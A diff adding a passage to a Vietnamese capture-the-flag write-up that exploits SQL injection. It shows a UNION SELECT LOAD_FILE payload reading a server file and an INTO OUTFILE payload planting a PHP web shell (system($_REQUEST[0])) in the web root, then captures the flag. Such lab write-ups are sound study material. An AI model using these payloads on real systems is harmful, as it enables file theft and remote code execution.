@@ -26,4 +26,18 @@ Dùng `abc' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into ou
 
 ![image](https://github.com/user-attachments/assets/6c0526db-006f-4b97-b8da-29d306562265)
 
+Tôi thử dùng `' UNION SELECT 1, LOAD_FILE("/var/www/html/dashboard/dashboard.php"), 3, 4, 5-- -` để test chức năng đọc file và nó đọc được:
 
+![image](https://github.com/user-attachments/assets/1689ebaf-3d3d-4a00-bdc2-000c49229987)
+
+Nhưng mà đọc trong /root thì cần pass của root nữa, tôi thử lại cái lệnh write 1 file vào nhưng là trong dashboard thì được `abc' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell.php'-- -` :
+
+![image](https://github.com/user-attachments/assets/d242c9b8-9d2e-4d97-96c4-64f1adaa8d34)
+
+![image](https://github.com/user-attachments/assets/61811283-3d9a-4432-b8a4-f6496751cefe)
+
+Flag đây rồi:
+
+![image](https://github.com/user-attachments/assets/f08b3c0c-5cbe-4b8f-830c-86c29137ed81)
+
+![image](https://github.com/user-attachments/assets/029ce8af-f6cb-4c8a-85c4-69d5c3049ce7)
